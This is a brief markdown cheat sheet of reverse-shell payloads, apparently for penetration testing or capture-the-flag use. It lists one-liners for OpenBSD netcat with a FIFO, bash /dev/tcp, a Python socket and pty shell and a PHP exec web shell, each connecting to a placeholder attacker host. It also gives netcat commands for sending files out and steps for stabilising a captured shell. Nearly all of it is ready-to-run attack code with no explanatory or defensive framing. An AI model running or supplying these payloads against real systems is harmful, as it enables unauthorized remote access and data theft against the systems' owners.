# Reverse shells

## OpenBSD
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker_ip attacker_port >/tmp/f
```

<br>

## Bash 
### Bash (in file)
```
 #!/bin/bash
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```
### Bash (command)
``` 
/bin/bash -c "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1"
``` 

<br>

## Nc 
```
nc -lvp port (listen on port) 
nc -lvp port -e /program (listen on port and lauch program at connection) 
nc addr port  (connect to port) 
nc -lvnp <port> > file (RECEIVE)
nc <to_IP> <to_port> < file (SEND)
```
<br>

## Python (linux)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_addr",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<br>

## PHP simple shell
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_attack/port_attack 0>&1'"); ?>
```

<br>

# Stabilizing shell

## Python
```
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  press ctrl+z key combination 
  (for zsh, one command): stty raw -echo; fg
  (for bash, two commands):
        stty raw -echo
        fg
```